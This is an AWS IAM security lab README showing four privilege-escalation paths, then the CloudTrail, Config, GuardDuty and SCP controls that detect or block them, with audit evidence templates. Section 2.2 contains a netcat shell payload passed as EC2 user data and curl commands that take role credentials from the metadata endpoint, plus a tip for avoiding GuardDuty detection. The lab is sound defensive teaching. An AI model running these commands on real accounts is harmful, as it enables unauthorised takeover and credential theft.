# AWS IAM Security

This repository is an AWS IAM security case study. It shows how common IAM permissions can create privilege escalation paths, then documents the detections, evidence requirements, and remediation controls needed to review the same issues in an audit.

## Table of Contents

- [AWS IAM Security](#aws-iam-security)
  - [Table of Contents](#table-of-contents)
  - [1. Users vs Roles vs User Groups](#1-users-vs-roles-vs-user-groups)
    - [1.1 User Groups](#11-user-groups)
    - [1.2 Users](#12-users)
    - [1.3 Roles](#13-roles)
  - [2. Exploits](#2-exploits)
    - [2.1 IAM Privilege Escalation - sts::AssumeRole](#21-iam-privilege-escalation---stsassumerole)
    - [2.2 EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole](#22-ec2-privilege-escalation---ec2runinstances-and-iampassrole)
    - [2.3 IAM Privilege Escalation - iam::CreateAccessKey](#23-iam-privilege-escalation---iamcreateaccesskey)
    - [2.4 IAM Privilege Escalation - iam::AddUserToGroup](#24-iam-privilege-escalation---iamaddusertogroup)
  - [3. Mitigations](#3-mitigations)
    - [3.1 AWS CloudTrail](#31-aws-cloudtrail)
    - [3.2 AWS Config](#32-aws-config)
    - [3.3 AWS GuardDuty](#33-aws-guardduty)
      - [3.3.1 Running Nmap for Ping Sweep](#331-running-nmap-for-ping-sweep)
      - [3.3.2 Unusual API Calls from unusual IP](#332-unusual-api-calls-from-unusual-ip)
    - [3.4 AWS IAM Access Analyzer](#34-aws-iam-access-analyzer)
    - [3.5 AWS Organizations and SCP Guardrails](#35-aws-organizations-and-scp-guardrails)
      - [3.5.1 Retest 1 - sts::AssumeRole Self-Escalation Path](#351-retest-1---stsassumerole-self-escalation-path)
  - [4. Audit Documentation](#4-audit-documentation)
    - [4.1 Documentation Index](#41-documentation-index)
    - [4.2 Evidence Templates](#42-evidence-templates)

## 1. Users vs Roles vs User Groups

We will first investigate the difference between Users, Roles, and User Groups

### 1.1 User Groups

User Groups are like a folder for IAM users. You can add users to that folder then attach permission policies to it. Any user in the group automatically gets those permissions. This way you can manage access for many users at once.

![iam user group dashboard](images/aws_iam_user_group_dashboard.png)
First, we will see the IAM - User Group Dashboard. Currently we did not create any group yet.

![iam user group create page](images/aws_iam_user_group_create_iam_management.png)
We will create an "IAM Management" user group, where IT service department (imaginary) can help you with the account creation and troubleshooting.

![iam user group IAM permissions](images/aws_iam_user_group_iam_permissions.png)
Here, I assigned all the permissions except the Root password create, delete, and audit permission. Since the IT department should not have the control of root but left the "IAM Full Access" permission which can be misused. (Will be exploited later in the lab)

### 1.2 Users

Users are account for a person or an application.  You give it a name and credentials (a password or access keys) so it can sign in or call AWS services.  You can attach permission policies to that user to grant it the rights it needs.

![iam user create](images/aws_iam_user_create_user_detail.png)
We will create an account called iam-service, so helpdesk professionals can use this account to resolve account troubleshooting.

![iam user assign permission](images/aws_iam_user_create_assign_permission.png)
We will assign the "IAM-Management" permission which we created earlier. We will demonstrate the privilege escalation later using this account

![iam user creation review](images/aws_iam_user_create_user_review.png)
Now we can review the new user detail and create it.

### 1.3 Roles

Roles are a job description you hand out on demand. Instead of a long lived user account with its own password or keys, a role has a set of permissions that anyone with the given permission can "assume" and use temporarily.

![iam role type selection](images/aws_iam_role_select_entity.png)
Select the type of role, you want to create. AWS service is a service account used for particular service such as EC2. Since we are going to use it for temporary permission assigning, we will select AWS account.

![iam role add permission](images/aws_iam_role_create_assign_permission.png)
Assign the permission that you want to allow the role to have. Here, I will give "AdministratorAccess" to the role I'm creating

![iam role add name and detail](images/aws_iam_role_create_role_detail.png)
I gave the name "AdminAccess" which is gonna be used by my "test-user" to gain admin privilege

![iam test user no permission](images/aws_iam_role_test_user_no_permission.png)
Currently there's no permission assigned to "test user". Now we are going to click "Add permissions" -> "Create inline policy" to assign the "AdminAccess" role privilege.

![iam test user assigning assume role privilege](images/aws_iam_role_assign_assumerole_to_user_1.png)
Here we will use json schema, then give "sts::AssumeRole" permission inside "Action", ARN of the role we want to use in the "Resource" section.

Here is the sample json schema:

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Sid": "Statement1",
   "Effect": "Allow",
   "Action": "sts:AssumeRole",
   "Resource": "arn:aws:iam::{aws account id}:role/AdminAccess"
  }
 ]
}
```

![iam test user inline policy name](images/aws_iam_role_assign_assumerole_to_user_2.png)
Next we will give the name of the inline policy (AssumeRole inline policy) as "TempAdminAccess". Create policy to give AdminAccess role access to the test user.

![iam test user no permission iam dashboard](images/aws_iam_role_test_user_no_permission_iam_dashboard.png)
We login as "test user" now. We can see we do not have any permission to view or modify in IAM dashboard, hence we will switch to "AdminAccess" role to gain privilege.

Click the top-right corner which displays the username @ account. Then select "Switch Role" to use "AssumeRole" privilege.

![iam switch role to AdminAccess](images/aws_iam_role_switch_role.png)
Fill in the correct account info, role name then confirm to switch to "AdminAccess" role

![iam switch role no permission](images/aws_iam_role_switch_role_no_permission.png)
> [!IMPORTANT]
> If you do not have "AssumeRole" policy in your user account, you will see this error above!

![iam switched to AdminAccess](images/aws_iam_role_switch_from_user.png)
Now we have the "AdminAccess" role privilege, so let's goto IAM dashboard again to check if we got access

![iam dashboard full access using AdminAccess](images/aws_iam_role_test_user_iam_dashboard_full_access.png)
We can see IAM dashboard now!

## 2. Exploits

### 2.1 IAM Privilege Escalation - sts::AssumeRole

Above, we gave [IAM Management User Group](#11-user-groups) with Full IAM Permission as IT department may need to troubleshoot with employee account, and to resolve, various IAM permission is required. However, giving full IAM Access is dangerous as we can escalate privilege to root using AssumeRole or other privileges.

Here we will self assign privilege using the "IAM Management" group privilege we created.

![iam service no privilege to access cloudtrail](images/aws_iam_role_privilege_escalation_no_cloudtrail_access.png)
We have a scenario where the IT service department want to access cloudtrail for curiousity, but they do not have permission to access it

![go to iam service user profile](images/aws_iam_role_privilege_escalation_self_assign_role_1.png)
Goto own user profile (iam service) then "Add permission" -> "Create inline policy"

![Assigning assume role privilege](images/aws_iam_role_privilege_escalation_self_assign_role_2.png)
Give "sts::AssumeRole" permission inside "Action", ARN of the role we want to use in the "Resource" section. [We did this before](#13-roles)

![iam service inline policy name](images/aws_iam_role_privilege_escalation_self_assign_role_3.png)
Assign the policy name to itself. (You can name whatever you want! Since this is a lab)

![iam service switch role](images/aws_iam_role_privilege_escalation_self_assign_role_4.png)
Click "Switch role" or if you have already have role registered, switch it [Refer here if you do not understand](#13-roles)

![iam service to AdminAccess](images/aws_iam_role_privilege_escalation_self_assign_role_5.png)
On the top-right, you can see we have successfully switched to "AdminAccess" role. You can now access CloudTrail as we got the administrative privilege.

### 2.2 EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole

We will show how to escalate privilege using EC2 RunInstance and PassRole permission. This is a common attack vector where an attacker can launch an EC2 instance with a role that has more permissions than the user currently has.

![create hacker user](images/aws_exploit_create_credential_exfiltration_user.png)
![hacker user permission](images/aws_exploit_create_credential_exfiltration_user_perm.png)
First, we will create a user called "hacker" with the ec2::RunInstance and iam::PassRole permission.

Make a script called `malicious.sh` with the following content:

```bash
#!/bin/bash
sudo busybox nc -lp 80 -e /bin/bash
```

> [!IMPORTANT]
> You need to know the security group name that allows inbound traffic on port 80. In this case, we will use "Default Web" security group which allows inbound traffic on port 80.

This script will open a reverse shell on port 80, allowing the attacker to connect to the instance.

```bash
aws ec2 run-instances --image-id <machine image or operating system used by the system> --instance-type t2.micro --iam-instance-profile Name=<IAM role for EC2> --user-data file://malicious.sh --security-groups "Default Web" --profile hacker
```

After running the above command, you will have a new EC2 instance running with the malicious script. The attacker can now get a reverse shell by connecting to the instance on port 80.

![ec2 instance running reverse shell](images/aws_exploit_credential_exfiltration_reverse_shell.png)
Connect to port 80 of the EC2 instance to get a reverse shell. Then extract the credentials from the metadata endpoint using the command:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Get the role name
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Extract the credentials
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Using the credentials extracted from the metadata, the attacker can use the AWS API key in aws cli to be used for enumeration and exploit.

However, the above method is not recommended as it can be [detected by AWS GuardDuty](#332-unusual-api-calls-from-unusual-ip). Instead, you can enumerate directly using the reverse shell or ssh into the instance.

### 2.3 IAM Privilege Escalation - iam::CreateAccessKey

![test-user containing create access key permission](images/aws_exploit_create_access_key_user_creation.png)
![create access key permission](images/aws_exploit_create_access_key_user_perm.png)
Here we will give "test-user" the create access key permission so that it can create the access keys for other users.

![create target with higher privilege](images/aws_exploit_create_access_key_create_target.png)
Next, we will create a "target" user that has higher privilege than the "test-user"

```bash
aws iam create-access-key --user-name target --profile test-user
```
After using the command for the "target" user, we will get the access and secret key for "target"

![target user credentials using create access key](images/aws_exploit_create_access_key_target_access_key_generation.png)
Finally we will verify the user of the access key after configuring to aws cli `aws configure --profile target`

We can verify the identity of target through the command:

```bash
aws sts get-caller-identity --profile target
```

After that we can get the "target" identity

![target sts identity](images/aws_exploit_create_access_key_target_pwned.png)

### 2.4 IAM Privilege Escalation - iam::AddUserToGroup

![create add user to group policy](images/aws_exploit_add_user_to_group_policy.png)
![assign test user to add user to group policy](images/aws_exploit_add_user_to_group_user_perm.png)
Here we will give "test-user" the "add user to group" permission so that it can assign the group to users.

![test user group before exploit](images/aws_exploit_add_user_to_group_test_user_groups.png)
We can see the test-user do not have any group assigned

Let's use the command below:

```bash
aws iam add-user-to-group --group-name AdminGroup --user-name test-user --profile test-user
```

![test user group after exploit](images/aws_exploit_add_user_to_group_user_groups_after_exploit.png)
After that we can see "AdminGroup" assigned to "test-user"

## 3. Mitigations

### 3.1 AWS CloudTrail

CloudTrail is AWS audit logging service that records all API calls and administrative actions in your AWS account. You can use this record to search for any security detection and investigations.

![cloudtrail creation](images/aws_cloudtrail_create_trail.png)
Create a trail workflow in order to record the logs. After creating the trail, you can log and view all the logs happen after that.

![cloudtrail assume role detection](images/aws_cloudtrail_switchrole_event_1.png)
You can detect [sts::AssumeRole](#13-roles) by searching for switchrole in cloudtrail. If you click the event, you can get further information in detail.

![cloudtrail detection specifics](images/aws_cloudtrail_switchrole_event_2.png)
![cloudtrail detection specifics](images/aws_cloudtrail_switchrole_event_3.png)
Here you can get the event information such as ip address of the source, instance/resource it used, the user/role it used for the access, the web browser information (user-agent) used to connect to the instance.

### 3.2 AWS Config

AWS Config is a compliance monitoring service that continuously tracks your AWS resource configurations and evaluates them against security best practices. Config warns you about dangerous configurations before they can be exploited.

![config iam setting](images/aws_config_setting_iam.png)
First, we need to enable AWS Config to monitor IAM resources. Start the configuration process to track IAM policies, roles, and users.

![config iam rules](images/aws_config_iam_rule.png)
AWS Config provides managed rules specifically for IAM security (There's others, but I specifically filtered the rules for IAM).

![config setting review](images/aws_config_setting_review.png)
Review the configuration settings before enabling Config. This will start monitoring all changes to your IAM resources and evaluate them against compliance rules automatically.

![config compliance status](images/aws_config_iam_rules_compliance_status.png)
The compliance dashboard shows which IAM resources violate security best practices. Here it shows I got few IAM bad practices such as password weakness, inline policy for AssumeRole.

### 3.3 AWS GuardDuty

AWS GuardDuty is a threat detection service that continuously monitors for malicious activity and unauthorized behavior to protect your AWS accounts, workloads, and data. GuardDuty finds threats by analyzing AWS CloudTrail event logs, VPC Flow Logs, and DNS logs.

![guardduty configuration for ec2](images/aws_guardduty_ec2_monitoring_setup_1.png)
First, enable GuardDuty. Then goto "Runtime Monitoring" to configure the service to monitor EC2 instances.

![vpc flow log configuration for guardduty](images/aws_guardduty_ec2_monitoring_setup_2.png)
Next, you need to enable VPC Flow Logs to monitor network traffic. This is required for GuardDuty to analyze network activity and detect threats.

![guardduty ec2 monitoring dashboard](images/aws_guardduty_dashboard.png)
The GuardDuty dashboard shows the status of your threat detection setup. It will start monitoring your instances and network traffic for suspicious activity.

#### 3.3.1 Running Nmap for Ping Sweep

Let's say your instance is compromised and the attacker is trying to scan your network using Nmap. GuardDuty will detect this malicious activity.

```bash
nmap -sn <target-ip>/<cidr>
```

![guardduty nmap detection](images/aws_guardduty_ec2_nmap_detection_1.png)
GuardDuty will alert you about the Nmap scan attempt. You can see the details of the detection.

![guardduty nmap detection details 1](images/aws_guardduty_ec2_nmap_detection_2.png)
![guardduty nmap detection details 2](images/aws_guardduty_ec2_nmap_detection_3.png)
![guardduty nmap detection details 3](images/aws_guardduty_ec2_nmap_detection_4.png)
You can see the specific details of the Nmap scan, including the instance, hacker details, and the process used for the attack. This helps you understand the attacker's intent and take appropriate action.

#### 3.3.2 Unusual API Calls from unusual IP

If an attacker is using the compromised instance to make unusual API calls, GuardDuty will also detect this. For example, you can extract the EC2 instance credentials from the metadata using the command `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. This can extract the temporary role credentials used by the instance.

Using these credentials, the attacker can use the AWS CLI to make API calls. For example, they can start enumerating IAM users:

```bash
aws iam list-users --profile <role-name>
```

![kali linux aws enum using ec2 role credentials](images/aws_guardduty_ec2_kali_enum.png)
Using the credentials extracted from the metadata, the attacker can use the AWS API key to enumerate IAM users and perform other actions. GuardDuty will detect this unusual activity.

> [!IMPORTANT]
> You need to extract the credentials from the metadata endpoint and use them in different endpoint to make API calls to trigger GuardDuty detection.

![guardduty unusual api call detection](images/aws_guardduty_ec2_kali_detection_1.png)
![guardduty list-users detection 1](images/aws_guardduty_ec2_kali_detection_2.png)
![guardduty list-users detection 2](images/aws_guardduty_ec2_kali_detection_3.png)
GuardDuty will alert you about the unusual API calls made from the compromised instance. You can see the details of the detection, including the specific API calls made and the instance involved.

### 3.4 AWS IAM Access Analyzer

AWS IAM Access Analyzer helps you identify resources in your account that are shared with other AWS accounts or is unused.

![create unused access analyzer](images/aws_iam_access_analyzer_create_unused_access.png)
First, you need to create an Access Analyzer. "Unused access analyzer" will identify resources that are not being used.

![unused access analyzer dashboard](images/aws_iam_access_analyzer_unused_access_dashboard.png)
Next, you can see the dashboard of the unused access analyzer.

![unused account](images/aws_iam_access_analyzer_unused_account.png)
The unused password shows the accounts that have not been used for the set period of time which we configured it for 3 days.

![unused access by admin](images/aws_iam_access_analyzer_unused_access_admin_1.png)
We can see all the unused permission by admin account. This is useful to identify unused permissions that can be removed to reduce the attack surface

![permission recommendation for admin](images/aws_iam_access_analyzer_unused_access_admin_2.png)
![permission recommendation for admin](images/aws_iam_access_analyzer_unused_access_admin_3.png)
You can see the permission recommendation for the admin account to remove unused permissions.

### 3.5 AWS Organizations and SCP Guardrails

AWS Organizations lets you group AWS accounts and apply service control policies to those accounts. An SCP sets the maximum permission that can be used in an account. It does not grant permission by itself. The user or role still needs IAM permission inside the account.

In this lab, we will use SCPs to protect the aws-iam-security-lab member account from the IAM privilege escalation paths shown earlier.

First, we opened AWS Organizations and created an organization with all features enabled.

![aws organizations create home](images/aws_organizations_create_home.png)
The AWS Organizations start page gives the option to create an organization for multiple AWS accounts.

![aws organizations create consideration](images/aws_organizations_create_consideration.png)
![aws organizations created success](images/aws_organizations_created_success.png)
Now we can see the organization was created successfully.

Next, we created an OU called "Sandbox". This OU is used for the lab account so the SCPs do not affect the management account.

![aws organizations create ou menu](images/aws_organizations_create_ou_menu.png)
Here, we selected the root and used the Actions menu to create a new organizational unit.

![aws organizations create ou sandbox](images/aws_organizations_create_ou_sandbox.png)
We named the organizational unit "Sandbox".

Then we created a member account called "aws-iam-security-lab".

![aws organizations create account form](images/aws_organizations_create_account_form.png)

After the member account was created, we moved it into the "Sandbox" OU.

![aws organizations move account menu](images/aws_organizations_move_account_menu.png)
Here, we selected "aws-iam-security-lab" and chose Move.

![aws organizations move account destination](images/aws_organizations_move_account_destination.png)
The destination is the "Sandbox" OU.

![aws organizations sandbox account](images/aws_organizations_sandbox_account.png)
Now we can see "aws-iam-security-lab" inside the "Sandbox" OU. Any SCP attached to "Sandbox" applies to this lab member account.

Next, we enabled service control policies.

![aws organizations policy types](images/aws_organizations_policy_types.png)
Under AWS Organizations policies, we selected Service control policies.

![aws scp enable service control policies](images/aws_scp_enable_service_control_policies.png)
SCPs must be enabled before we can attach custom guardrails to the OU.

The first custom SCP is called "DenySensitiveIAMChanges". This policy blocks IAM actions that can be used for self-escalation in this repo.

![aws scp create deny sensitive iam changes](images/aws_scp_create_deny_sensitive_iam_changes.png)
Here, we created the "DenySensitiveIAMChanges" policy.

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Sid": "DenyDangerousIamEscalationActionsExceptTrustedAdmins",
   "Effect": "Deny",
   "Action": [
    "iam:CreateAccessKey",
    "iam:PutUserPolicy",
    "iam:AttachUserPolicy",
    "iam:PutGroupPolicy",
    "iam:AttachGroupPolicy",
    "iam:AddUserToGroup",
    "iam:UpdateAssumeRolePolicy",
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion"
   ],
   "Resource": "*",
   "Condition": {
    "ArnNotLike": {
     "aws:PrincipalArn": [
      "arn:aws:iam::*:role/SecurityAdmin",
      "arn:aws:iam::*:role/OrganizationAccountAccessRole"
     ]
    }
   }
  }
 ]
}
```

This SCP blocks the risky IAM actions for normal users and roles. We added trusted admin role exceptions so the lab can still be cleaned up from the approved admin path.

The second custom SCP is called DenyPassingAdminRoles. This policy blocks `iam:PassRole` when the role name looks like an admin role.

![aws scp create deny passing admin roles](images/aws_scp_create_deny_passing_admin_roles.png)
Here, we created the DenyPassingAdminRoles policy.

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Sid": "DenyPassingAdminRolesToServicesExceptTrustedAdmins",
   "Effect": "Deny",
   "Action": "iam:PassRole",
   "Resource": [
    "arn:aws:iam::*:role/AdminAccess",
    "arn:aws:iam::*:role/*Admin*",
    "arn:aws:iam::*:role/*Administrator*"
   ],
   "Condition": {
    "ArnNotLike": {
     "aws:PrincipalArn": [
      "arn:aws:iam::*:role/SecurityAdmin",
      "arn:aws:iam::*:role/OrganizationAccountAccessRole"
     ]
    }
   }
  }
 ]
}
```

This SCP is meant to stop the EC2 privilege escalation path where a user launches an instance with an admin instance profile.

After creating both policies, we can see them in the SCP policy list.

![aws scp available policies](images/aws_scp_available_policies.png)
The custom policies are listed with the AWS managed `FullAWSAccess` policy.

Before attaching the custom SCPs, the Sandbox OU had `FullAWSAccess` available through the root path.

![aws scp sandbox policies before](images/aws_scp_sandbox_policies_before.png)
![aws scp sandbox policies inherited](images/aws_scp_sandbox_policies_inherited.png)
Here, we can see the inherited `FullAWSAccess` policy from the root.

Finally, attach these policies to the `Sandbox` OU

- `FullAWSAccess`
- `DenySensitiveIAMChanges`
- `DenyPassingAdminRoles`

![aws scp attach policy selection](images/aws_scp_attach_policy_selection.png)

![aws scp sandbox policies after](images/aws_scp_sandbox_policies_after.png)

`FullAWSAccess` stays attached because this lab uses a deny list SCP setup. It allows the account to use AWS services at the SCP layer, while the two custom SCPs block the dangerous IAM paths. The final permission still depends on the IAM policy inside the member account.

After attaching the SCPs, we retest the four exploit scenarios from [section 2](#2-exploits). The expected result is that IAM may allow the test user to try the action, but the SCP blocks the final request in the `aws-iam-security-lab` account.

#### 3.5.1 Retest 1 - sts::AssumeRole Self-Escalation Path

For the first retest, we started with the `sts:AssumeRole` self-escalation path from [section 2.1](#21-iam-privilege-escalation---stsassumerole). The goal was to prepare an iam-service user that could normally create its own inline policy, then confirm the `DenySensitiveIAMChanges` SCP blocks the escalation path inside the Sandbox OU.

![aws retest assumerole create iam service user](images/aws_retest_assumerole_create_iam_service_user.png)
First, we created an admin role in the member account. This retest uses `AdminAccessRole`, which has the same purpose as the earlier `AdminAccess` role from the exploit walkthrough.

![aws retest assumerole admin role permission](images/aws_retest_assumerole_admin_role_permission.png)
Here, we selected the AWS managed `AdministratorAccess` policy for the role.

![aws retest assumerole admin role review](images/aws_retest_assumerole_admin_role_review.png)
The trust policy allows same-account role assumption in the lab account. This gives us a privileged role to test against during the retest.

Then we created a customer managed policy named iam-service-policy. The policy allows iam-service to call iam:PutUserPolicy on itself.

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Effect": "Allow",
   "Action": "iam:PutUserPolicy",
   "Resource": "arn:aws:iam::<member-account-id>:user/iam-service"
  }
 ]
}
```

![aws retest assumerole put user policy allow](images/aws_retest_assumerole_putuserpolicy_allow.png)
This permission is dangerous because the user can add an policy that allows `sts:AssumeRole` into an admin role.

![aws retest assumerole policy review](images/aws_retest_assumerole_policy_review.png)
The policy review page shows that the policy grants limited IAM permission management for iam-service.

We then tried to attach iam-service-policy directly to the iam-service user.

![aws retest assumerole attach policy to user](images/aws_retest_assumerole_attach_policy_to_user.png)
The selected policy would normally give the user enough permission to continue the self escalation test.

![aws retest assumerole user review](images/aws_retest_assumerole_user_review.png)
The final user review shows iam-service-policy attached as a permissions policy before creation.

When we created the user, AWS created iam-service, but it failed to attach the policy. This pass used the member account root user, and the SCP still applied because root is inside the member account and is not one of the exception roles in the policy. The error shows an explicit deny from a service control policy.

![aws retest assumerole scp attach user policy denied](images/aws_retest_assumerole_scp_attachuserpolicy_denied.png)
This is the expected guardrail behavior for the first retest. The `DenySensitiveIAMChanges` SCP blocks `iam:AttachUserPolicy`, so the user cannot receive the policy that would allow it to create its own `sts:AssumeRole` path.

![aws retest assumerole cloudtrail attach user policy denied](images/aws_retest_assumerole_cloudtrail_attachuserpolicy_denied.png)
CloudTrail also recorded the denied request.

This retest shows that the SCP blocks the policy attachment step in the member account. A later pass can run the exact `iam:PutUserPolicy` or `sts:AssumeRole` denial as iam-service if we want evidence for the final exploit action as well.

## 4. Audit Documentation

The lab screenshots show the attack path and the AWS security services used for detection. The files below add the control review view: scope, risk, evidence, remediation, and framework mapping.


### 4.1 Documentation Index

| Document | What it covers |
|---|---|
| [Architecture and Scope](docs/architecture.md) | Lab account scope, identities, trust boundaries, assumptions, and secure target state. |
| [Scenario Matrix](docs/scenario-matrix.md) | Risk, evidence, preventive control, detective control, and target outcome for each exploit. |
| [Control Mapping](docs/control-mapping.md) | AWS guidance, CIS AWS Foundations anchors where applicable, ISO/IEC 27001-relevant controls, and required evidence. |
| [Risk Register](docs/risk-register.md) | Prioritized risks, current controls, target controls, residual risk, and owner placeholders. |
| [Remediation Playbooks](docs/remediation-playbooks/README.md) | Control fixes for the four privilege escalation scenarios. |
| [Limitations](docs/limitations.md) | What the repo proves today, which exports are still needed, and what is out of scope. |

### 4.2 Evidence Templates

Evidence folders are templates until real AWS exports are added. Do not treat them as proof by themselves.

| Scenario | Evidence folder | What to collect |
|---|---|---|
| `sts:AssumeRole` self-escalation | [evidence/assume-role](evidence/assume-role/README.md) | CloudTrail events, before and after IAM policies, role trust policy, denied retest proof, cleanup note. |
| `ec2:RunInstances` with `iam:PassRole` | [evidence/passrole-runinstances](evidence/passrole-runinstances/README.md) | RunInstances event, instance profile details, security group settings, GuardDuty findings, IMDSv2 proof, cleanup note. |
| `iam:CreateAccessKey` for another user | [evidence/create-access-key](evidence/create-access-key/README.md) | CreateAccessKey event, target user permission proof, key revocation proof, denied retest proof, cleanup note. |
| `iam:AddUserToGroup` self-escalation | [evidence/add-user-to-group](evidence/add-user-to-group/README.md) | AddUserToGroup event, group policy export, before and after membership proof, access review note, denied retest proof. |

Raw evidence should come from the AWS account used for the lab. Do not commit live access keys, secret access keys, session tokens, account IDs, or public IP addresses unless they are redacted.
